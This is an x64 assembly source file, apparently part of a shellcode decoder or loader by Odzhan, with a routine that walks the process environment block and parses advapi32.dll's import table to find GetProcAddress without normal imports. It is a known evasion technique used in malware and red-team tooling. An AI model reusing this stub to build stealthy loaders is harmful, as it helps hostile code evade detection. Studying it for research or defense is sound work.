;
;  Copyright © 2019 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
; 
    bits   64
    
    %include "decode.inc"
    
    ; shadow or home space for API call
    struc home_space
      ._rcx  resq 1
      ._rdx  resq 1
      ._r8   resq 1
      ._r9   resq 1
    endstruc

    ; structure for stack allocation
    struc work_space
      hs                   resb home_space_size
      
      arg0                 resq 1
      arg1                 resq 1
      arg2                 resq 1
      arg3                 resq 1
      arg4                 resq 1
      
      ; local variables
      inlen                resd 1
      outlen               resd 1
      outbuf               resq 1
      
      ; function pointers
      _lstrlenA            resq 1
      _CryptStringToBinary resq 1
      _VirtualAlloc        resq 1
      _VirualFree          resq 1
      _RtlExitUserThread   resq 1
    endstruc

    %define WORK_SPACE_LEN ((work_space_size & -16) + 16) - 8 
    
    %ifndef BIN
      global gpa
    %endif
    
gpa:
    ; save non-volatile registers
    pushx  rsi, rbx, rdi, rbp
    ; search the import table of kernel32.dll for address of GetProcAddress and LoadLibraryA
    push   TEB.ProcessEnvironmentBlock
    pop    rdx
    
    mov    rax, [gs:rdx]
    mov    rax, [rax+PEB.Ldr]
    mov    rdi, [rax+PEB_LDR_DATA.InLoadOrderModuleList + LIST_ENTRY.Flink]
    jmp    get_dll
next_dll:    
    mov    rdi, [rdi+LDR_DATA_TABLE_ENTRY.InLoadOrderLinks + LIST_ENTRY.Flink]
get_dll:
    mov    rbx, [rdi+LDR_DATA_TABLE_ENTRY.DllBase]
    push   rdx
    movzx  ecx, word[rdi+LDR_DATA_TABLE_ENTRY.BaseDllName + UNICODE_STRING.Length]
    mov    rsi, [rdi+LDR_DATA_TABLE_ENTRY.BaseDllName + UNICODE_STRING.Buffer]
    shr    ecx, 1
    xor    eax, eax
    cdq
hash_dll_name:
    lodsw
    or     al, 0x20
    ror    edx, 13
    add    edx, eax
    loop   hash_dll_name
    cmpms  "advapi32.dll"
    pop    rdx
    jnz    next_dll
    
    ; Now search for kernel32.dll in import directory
    add    edx, [rbx+IMAGE_DOS_HEADER.e_lfanew]
    mov    esi, [rbx+rdx+IMAGE_NT_HEADERS.OptionalHeader + \
                         IMAGE_OPTIONAL_HEADER.DataDirectory + \
                         IMAGE_DIRECTORY_ENTRY_IMPORT * IMAGE_DATA_DIRECTORY_size + \
                         IMAGE_DATA_DIRECTORY.VirtualAddress - \
                         TEB.ProcessEnvironmentBlock]
    add    rsi, rbx
find_k32:
    lodsd                    ; OriginalFirstThunk
    xchg   eax, edx
    lodsq                    ; skip TimeDateStamp and ForwarderChain
    lodsd                    ; Name
    xchg   eax, ecx          ; store in ecx
    lodsd                    ; FirstThunk
    xchg   eax, edi          ; store in edi
    
    ; kernel32?
    mov    rax, 'kernel32'
    mov    rcx, [rbx+rcx]
    mov    rbp, 2020202020202020h
    or     rcx, rbp
    cmp    rax, rcx
    jnz    find_k32
    
    ; found it. locate GetProcAddress
    lea    rsi, [rdx+rbx]    ; oft = RVA2VA(PIMAGE_THUNK_DATA, cs, imp->OriginalFirstThunk);
    add    rdi, rbx          ; ft  = RVA2VA(PIMAGE_THUNK_DATA, cs, imp->FirstThunk);
find_gpa:
    lodsq                    ; oft++
    scasq                    ; ft++
    xchg   eax, ecx          ; if (oft->u1.AddressOfData == 0) break;
    jecxz  exit_gpa
    btr    ecx, 31           ; IMAGE_SNAP_BY_ORDINAL(oft->u1.Ordinal)
    jc     find_gpa
    
    cmp    dword[rcx+rbx+IMAGE_IMPORT_BY_NAME.Name], 'GetP'
    jnz    find_gpa
    
    ; don't check 'rocA'
    cmp    dword[rcx+rbx+IMAGE_IMPORT_BY_NAME.Name+8], 'ddre'
    jnz    find_gpa
    
    mov    rcx, [rdi-8]       ; rcx = ft->u1.Function
exit_gpa:
    push   rcx
    pop    rax
    ; restore non-volatile registers
    popx   rsi, rbx, rdi, rbp
    ret
    
    